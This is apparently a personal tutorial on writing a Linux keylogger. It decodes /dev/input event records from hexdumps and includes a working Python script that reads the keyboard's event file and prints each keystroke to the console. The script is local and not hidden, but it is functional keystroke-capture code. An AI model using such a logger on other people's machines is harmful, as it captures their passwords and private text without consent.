# Keyboard Logging

At Linux, nearly every process is controllable and parsable. Today I use that knowledge to write a keyboard logger.  

Research starts with "How does a computer parse a keyboard input?"  
There is an answer which is X11. [Click here for info]( https://en.wikipedia.org/wiki/X_Window_System#Software_architecture "Click here for info")

X11 reads keyboard inputs from the kernel then parses them for use in an application.  
X11's input sources are named "event" and they are stored in /dev/input at Linux OS.  
/dev is a kernel directory for listing devices and my input devices (keyboard, mouse, joystick, etc.) listed at /dev/input.

![Img1](/Img/Img1.png)

Computers have different input sources, so I have to look /proc/bus/input/devices file to understand which is my selected device.  


    I: Bus=0011 Vendor=0001 Product=0001 Version=ab41
    N: Name="AT Translated Set 2 keyboard"
    P: Phys=isa0060/serio0/input0
    S: Sysfs=/devices/platform/i8042/serio0/input/input3
    U: Uniq=
    H: Handlers=sysrq kbd event3 leds 
    B: PROP=0
    B: EV=120013
    B: KEY=500f02000403 3803078f870d001 feffffdffbefffff fffffffffffffffe
    B: MSC=10
    B: LED=7


As seen my device has a different handler for capturing the input, in that situation I use the event3 handler for keyboard inputs.  
Event files are character special file, so they can be readable in real timely.

![Img2](/Img/Img2.png)

I just press the A button on the keyboard and at two windows have an action.  
When trying to read the raw output, just get meanless characters.  But 2nd window I can associate some information.  
After a lot of tests I notice that structure:  



## Analyzing the Event Output

Raw hexdump output:  

```
 2288 60f0 0000 0000 d7e5 0000 0000 0000
 0004 0004 001e 0000 2288 60f0 0000 0000
 d7e5 0000 0000 0000 0001 001e 0001 0000
 2288 60f0 0000 0000 d7e5 0000 0000 0000
 0000 0000 0000 0000 2288 60f0 0000 0000
 312a 0002 0000 0000 0004 0004 001e 0000
 2288 60f0 0000 0000 312a 0002 0000 0000
 0001 001e 0000 0000 2288 60f0 0000 0000
 312a 0002 0000 0000 0000 0000 0000 0000
```


First 4 bytes are repeats every 24 bytes. After decombine, there are 6 unlike input I have.

```
 2288 60f0 0000 0000 d7e5 0000 0000 0000 0004 0004 001e 0000
 2288 60f0 0000 0000 d7e5 0000 0000 0000 0001 001e 0001 0000
 2288 60f0 0000 0000 d7e5 0000 0000 0000 0000 0000 0000 0000

 2288 60f0 0000 0000 312a 0002 0000 0000 0004 0004 001e 0000
 2288 60f0 0000 0000 312a 0002 0000 0000 0001 001e 0000 0000 
 2288 60f0 0000 0000 312a 0002 0000 0000 0000 0000 0000 0000
```

When separate 3 by 3, the 2nd part is unnecessary. (Because I didn't understand why the same signal goes at different times) *  
Then I test some variables like time, several buttons, different situations.  
I've found that structure;  

```
 2288 60f0 0000 0000 d7e5 0000 0000 0000 0004 0004 001e 0000
 =========           =========           ==== ==== =========
```

> 1st part is Unix timestamp with hex  
>2nd part is microsecond  
>3rd part is type signal  
>4th part is code  
>5th part is value of the signal  


Before starting the written script we'd better take a look at these resources for understanding the type codes:  
Event types : [Click me](https://github.com/torvalds/linux/blob/8096acd7442e613fad0354fc8dfdb2003cceea0b/include/uapi/linux/input-event-codes.h#L35 "Click me")  
Event codes meaning : [Click me](https://www.kernel.org/doc/Documentation/input/event-codes.txt "Click me")  
Key Map : [Click me](https://github.com/torvalds/linux/blob/8096acd7442e613fad0354fc8dfdb2003cceea0b/include/uapi/linux/input-event-codes.h#L75-L338 "Click me")  


## The Keyboard Logger Script  
Here is my python script  


```python
import struct, keymap

event = open("/dev/input/event3", "rb")
inpt = event.read(24)
chk = ['a']									# **


while inpt:
	(uts, msec, typ, code, value) = struct.unpack('llhhi', inpt)

	if typ == 1:
		chk.append(code)
		if chk[-1] != chk[-2]:
			print(keymap.char[code], end='', flush=True)
		else:
			chk = ['a']
			
	elif typ == 17:
		if value == 1: print("ON", end='', flush=True)
		elif value == 0: print("OFF", end='', flush=True)
		
	elif (typ == 4 and code == 4) or typ == 0:
		pass
	else:
		print("type:%d code:%d value:%d" % (typ,code,value))
	inpt = event.read(24)
event.close()
```
###### (**)The chk list does not print the same value to the console, due to unnecessary input data. (Look for *)  

First step is to define the structure, I've done it with the struct module.  
With struct, I separate the event parts with long,long,short_int,short_int,int structure. **(Line 9)**  

Input signal types are controlled with conditions.  
When the 1 type code appears that's means the keyboard button is activated. **(Line 11)**  
For the 4 and 0 codes, there is a pass because of their types. **(Line 22)**  
If a LED trigger button is pressed like CAPSLOCK, NUMLOCK, the 17 code appears and prints the status of the button. **(Line 18)**  
There is a problem that will emerge script show their type, code, and value data. **(Line 24)**  

I made a class that name is keymap for define code value to keyboard character.  
```
char = {
...
	30: "a",
	31: "s",
	32: "d",
```  
Last controls are completed value of the value translate to character and print to the console.  

Thanks for reading.  


https://user-images.githubusercontent.com/87504697/128570790-b93603c0-749b-4e15-ad16-fd9a67fd8aa5.mov





